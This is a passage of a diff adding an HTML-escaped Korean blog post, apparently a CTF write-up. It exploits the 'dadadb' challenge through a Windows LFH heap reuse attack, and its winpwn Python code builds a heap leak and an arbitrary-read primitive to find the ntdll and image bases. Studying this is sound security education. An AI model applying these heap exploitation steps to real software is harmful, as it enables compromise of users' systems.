+	add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH&amp;quot;&lt;/span&gt;+str(i),&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;BBBB&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%209.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;LFH&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; chunk&amp;#xB4E4;&amp;#xC774; &amp;#xBB34;&amp;#xC791;&amp;#xC704;&amp;#xB85C; heap&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xBB34;&amp;#xC791;&amp;#xC704;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xC5B4; chunk &amp;#xAC04; &amp;#xAC70;&amp;#xB9AC;&amp;#xAC00; &amp;#xBD88;&amp;#xADDC;&amp;#xCE59;&amp;#xD558;&amp;#xBA74; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; chunk&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC5B4;&amp;#xB824;&amp;#xC6CC;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD55C;&amp;#xB9C8;&amp;#xB514;&amp;#xB85C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; heap layout&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xAE30; &amp;#xD798;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC8E0;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC73C;&amp;#xB85C;&amp;#xB294; reliable &amp;#xD55C; leak&amp;#xC774; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;.. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC;! &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8;&amp;#xAE4C; &amp;#xC774;&amp;#xB7F0; &amp;#xC0BD;&amp;#xC9C8;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xAC70; &amp;#xC544;&amp;#xB2C8;&amp;#xACA0;&amp;#xC5B4;&amp;#xC694;?&amp;#x314E;&amp;#x314E;&lt;/p&gt;
+&lt;h2 id=&#34;LFH-Reuse-Attack&#34;&gt;&lt;a href=&#34;#LFH-Reuse-Attack&#34; class=&#34;headerlink&#34; title=&#34;LFH Reuse Attack&#34;&gt;&lt;/a&gt;LFH Reuse Attack&lt;/h2&gt;&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xC804; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC30;&amp;#xC6B4; &lt;a href=&#34;https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation&#34;&gt;reuse attack&lt;/a&gt;&amp;#xC744; &amp;#xC368;&amp;#xBA39;&amp;#xC744; &amp;#xCC28;&amp;#xB840;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB34;&amp;#xC791;&amp;#xC704; &amp;#xD560;&amp;#xB2F9;&amp;#xC73C;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xB420; chunk &amp;#xC704;&amp;#xCE58;&amp;#xB97C; &amp;#xC608;&amp;#xCE21;&amp;#xD558;&amp;#xAE30; &amp;#xD798;&amp;#xB4E4;&amp;#xB2E4;&amp;#xBA74;? &amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4; &amp;#xCC44;&amp;#xC6CC;&amp;#xBC84;&amp;#xB9AC;&amp;#xACE0; &amp;#xD55C; &amp;#xACF3;&amp;#xB9CC; &amp;#xB0A8;&amp;#xACA8;&amp;#xB194;&amp;#xC11C; &amp;#xC608;&amp;#xCE21; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2010.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;#xC120;&amp;#xD0DD;&amp;#xC9C0;&amp;#xB294; &amp;#xC5C6;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB9BC;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2011.png&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;LFH chunk&amp;#xB85C; userblock&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xCC44;&amp;#xC6C1;&amp;#xB2C8;&amp;#xB2E4;. &lt;/li&gt;
+&lt;li&gt;&amp;#xC784;&amp;#xC758;&amp;#xC758; chunk(&amp;#xC5EC;&amp;#xAE30;&amp;#xC11C;&amp;#xB294; LFH5)&amp;#xB97C; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC; userblock&amp;#xC5D0;&amp;#xB294; &amp;#xBE48; &amp;#xACF5;&amp;#xAC04;&amp;#xC774; LFH5&amp;#xAC00; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xACF5;&amp;#xAC04;&amp;#xBC16;&amp;#xC5D0; &amp;#xB0A8;&amp;#xC544;&amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;add LFH4&amp;#xB85C; &lt;code&gt;LFH4&amp;#x2192;data&lt;/code&gt;&amp;#xB97C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xBA74; LFH&amp;#xB294; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; chunk &amp;#xC6B0;&amp;#xC120;&amp;#xC73C;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5B4; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; LFH5 &amp;#xACF5;&amp;#xAC04;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C; data&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.  &lt;/li&gt;
+&lt;li&gt;3&amp;#xBC88;&amp;#xC758; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; overflow &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC81C; &amp;#xC539;&amp;#xACE0; &amp;#xB72F;&amp;#xACE0; &amp;#xB9DB;&amp;#xBCF4;&amp;#xACE0; &amp;#xC990;&amp;#xAE30;&amp;#xAE30;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xBA3C;&amp;#xC800; LFH chunk&amp;#xB97C; 0~16&amp;#xAE4C;&amp;#xC9C0; 17&amp;#xAC1C;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2012.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB79C;&amp;#xB364; &amp;#xD55C; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xC5B4; &amp;#xC21C;&amp;#xC11C;&amp;#xB294; &amp;#xB4A4;&amp;#xC8FD;&amp;#xBC15;&amp;#xC8FD;&amp;#xC774;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC639;&amp;#xAE30;&amp;#xC885;&amp;#xAE30; &amp;#xC608;&amp;#xC058;&amp;#xAC8C; &amp;#xBAA8;&amp;#xC5EC;&amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. chunk17&amp;#xBD80;&amp;#xD130;&amp;#xB294; &amp;#xC544;&amp;#xB798; &amp;#xC0AC;&amp;#xC9C4;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xC0C8; userblock&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; LFH chunk&amp;#xB294; &amp;#xAE30;&amp;#xC874; userblock&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xCC44;&amp;#xC6B8; &amp;#xC815;&amp;#xB3C4;&amp;#xC778; 0~16&amp;#xAE4C;&amp;#xC9C0; 17&amp;#xAC1C;&amp;#xB9CC; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; &lt;code&gt;ActiveSubsegment-&amp;gt;AggregateExchg-&amp;gt;Depth&lt;/code&gt;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; userblock&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; block&amp;#xC774; &amp;#xC5BC;&amp;#xB9C8;&amp;#xB098; &amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2013.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xC81C; LFH5 chunk&amp;#xB97C; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xACE0; add(LFH4)&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xC81C;&amp;#xD6C4; &amp;#xC7AC; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &lt;code&gt;LFH4&amp;#x2192;data&lt;/code&gt; &amp;#xAC00; LFH5 chunk&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD574; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. data&amp;#xC5D0; &amp;#xC785;&amp;#xB825;&amp;#xD55C; &lt;code&gt;aaaaaaaa&lt;/code&gt; &amp;#xB3C4; &amp;#xC798; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00; &amp;#xC788;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2014.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xC81C; &lt;code&gt;0x70&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xCC44;&amp;#xC6B0;&amp;#xBA74; &amp;#xB4A4;&amp;#xC758; heap address&amp;#xB85C; heap base address&amp;#xC640; &amp;#xBC14;&amp;#xB85C; &amp;#xB4A4; chunk&amp;#xC758; key&amp;#xAE4C;&amp;#xC9C0; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; winpwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;
+
+context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;
+p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./dadadb.exe&amp;quot;&lt;/span&gt;)
+
+login(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
+&lt;span class=&#34;hljs-comment&#34;&gt;## enable LFH&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;):
+	add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;l0ch&amp;quot;&lt;/span&gt;+str(i),&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;B&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;## fill userblock&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;):
+	add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH&amp;quot;&lt;/span&gt;+str(i),&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;B&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;)
+
+delete(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH5&amp;quot;&lt;/span&gt;)
+add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;a&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;)
+view(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH4&amp;quot;&lt;/span&gt;)
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;)
+heap_base = u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xffffffffffff0000&lt;/span&gt; 
+
+p.recvuntil(p64(&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;))
+key = p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;)[:&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;]
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;heap : &amp;quot;&lt;/span&gt;,hex(heap_base))
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;key :&amp;quot;&lt;/span&gt;,key)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2015.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBC14;&amp;#xB85C; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; chunk&amp;#xC758; key&amp;#xB97C; &amp;#xAD6C;&amp;#xD588;&amp;#xC73C;&amp;#xB2C8; overflow&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; leak &amp;#xD55C; key&amp;#xC758; &lt;code&gt;data&lt;/code&gt; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD558;&amp;#xBA74; arbitrary read&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xC8E0;! &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB4E4;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ntdll base: ROP gadget&lt;/li&gt;
+&lt;li&gt;image base&lt;/li&gt;
+&lt;li&gt;kernel32 base: &lt;code&gt;CreateFile()&lt;/code&gt;, &lt;code&gt;ReadFile()&lt;/code&gt;, &lt;code&gt;WriteFile()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;PEB : &lt;code&gt;ProcessParameters&lt;/code&gt;(stdin, stdout, stderr)&lt;/li&gt;
+&lt;li&gt;stack address&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ntdll-base&#34;&gt;&lt;a href=&#34;#ntdll-base&#34; class=&#34;headerlink&#34; title=&#34;ntdll base&#34;&gt;&lt;/a&gt;ntdll base&lt;/h2&gt;&lt;p&gt;&lt;code&gt;_HEAP-&amp;gt;LockVariable-&amp;gt;Lock&lt;/code&gt; &amp;#xC740; &lt;code&gt;heap_base + 0x2c0&lt;/code&gt; &amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD574; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2016.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2017.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Lock - 0x163d30&lt;/code&gt; &amp;#xB85C; ntdll&amp;#xC758; base address&amp;#xB97C; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; ntdll &amp;#xBC84;&amp;#xC804;&amp;#xC774; &amp;#xBC14;&amp;#xB00C;&amp;#xC5B4; &lt;code&gt;0x163dd0&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xB00C;&amp;#xC5C8;&amp;#xB2E4;&amp;#xB294; &amp;#xC2AC;&amp;#xD508; &amp;#xC0AC;&amp;#xC5F0;&amp;#xC774;&amp;#x2026; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xBBF8;&amp;#xC6CC;)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readmem&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;key, addr&lt;/span&gt;):&lt;/span&gt;
+	add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LFH4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;a&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt; + p64(addr))
+	view(key)
+	p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Data:&amp;quot;&lt;/span&gt;)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;
+
+Lock = readmem(key, heap_base+&lt;span class=&#34;hljs-number&#34;&gt;0x2c0&lt;/span&gt;)&lt;span class=&#34;hljs-comment&#34;&gt;# _HEAP-&amp;gt;LockVariable-&amp;gt;Lock&lt;/span&gt;
+ntdll = Lock - &lt;span class=&#34;hljs-number&#34;&gt;0x163dd0&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#Lock - ntdll base address offset&lt;/span&gt;
+print(hex(ntdll))&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2018.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Imagebase&#34;&gt;&lt;a href=&#34;#Imagebase&#34; class=&#34;headerlink&#34; title=&#34;Imagebase&#34;&gt;&lt;/a&gt;Imagebase&lt;/h2&gt;&lt;p&gt;ntdll &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAD6C;&amp;#xD588;&amp;#xC73C;&amp;#xBA74; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC758; imagebase&amp;#xB3C4; &amp;#xAE08;&amp;#xBC29; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xB85C; &lt;code&gt;PebLdr&lt;/code&gt; &amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xAD6C;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;PebLdr : &amp;#xB85C;&amp;#xB4DC;&amp;#xB41C; &amp;#xBAA8;&amp;#xB4C8;&amp;#xB4E4;&amp;#xC758; Double Linked List&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;_PEB&amp;#x2192;Ldr&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC38;&amp;#xC870;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; lm 
+start             end                 module name
+...           
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`ea290000 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`ea47d000   ntdll      (pdb symbols)    
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dt ntdll!_PEB @$peb Ldr
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; Ldr : &lt;span class=&#34;hljs-number&#34;&gt;0x00007ffd&lt;/span&gt;`ea3f53c0 _PEB_LDR_DATA
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dx -r1 ((ntdll!_PEB_LDR_DATA *)&lt;span class=&#34;hljs-number&#34;&gt;0x7ffdea3f53c0&lt;/span&gt;)
+((ntdll!_PEB_LDR_DATA *)&lt;span class=&#34;hljs-number&#34;&gt;0x7ffdea3f53c0&lt;/span&gt;)            : &lt;span class=&#34;hljs-number&#34;&gt;0x7ffdea3f53c0&lt;/span&gt; [Type: _PEB_LDR_DATA *]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Length           : &lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt; [Type: unsigned long]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x004&lt;/span&gt;] Initialized      : &lt;span class=&#34;hljs-number&#34;&gt;0x1&lt;/span&gt; [Type: unsigned char]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x008&lt;/span&gt;] SsHandle         : &lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt; [Type: &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; *]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x010&lt;/span&gt;] InLoadOrderModuleList [Type: _LIST_ENTRY]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt;] InMemoryOrderModuleList [Type: _LIST_ENTRY]
+...
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; ? &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`ea3f53c0 - &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`ea290000
+Evaluate expression: &lt;span class=&#34;hljs-number&#34;&gt;1463232&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;001653&lt;/span&gt;c0&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;PebLdr&lt;/code&gt; &amp;#xC740; &lt;code&gt;ntdll + 0x1653c0&lt;/code&gt; &amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;PebLdr&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBB38;&amp;#xC81C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; dadadb&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xBAA8;&amp;#xB4C8;&amp;#xC774; &amp;#xB85C;&amp;#xB4DC;&amp;#xB418;&amp;#xBA74; &lt;code&gt;ntdll!_PEB_LDR_DATA&amp;#x2192;InMemoryOrderModuleList(+0x20)&lt;/code&gt; &amp;#xC5D0; &amp;#xBA3C;&amp;#xC800; &amp;#xB85C;&amp;#xB4DC;&amp;#xB41C; &amp;#xC21C;&amp;#xC11C;&amp;#xB300;&amp;#xB85C; Double Linked List&amp;#xB85C; &amp;#xC5F0;&amp;#xACB0;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &amp;#xC2E4;&amp;#xD589;&amp;#xC911;&amp;#xC778; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB3C4; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; &amp;#xC62C;&amp;#xB77C;&amp;#xC640; &amp;#xC788;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dx -r1 (*((ntdll!_LIST_ENTRY *)&lt;span class=&#34;hljs-number&#34;&gt;0x7ffdea3f53e0&lt;/span&gt;))
+(*((ntdll!_LIST_ENTRY *)&lt;span class=&#34;hljs-number&#34;&gt;0x7ffdea3f53e0&lt;/span&gt;))                 [Type: _LIST_ENTRY]
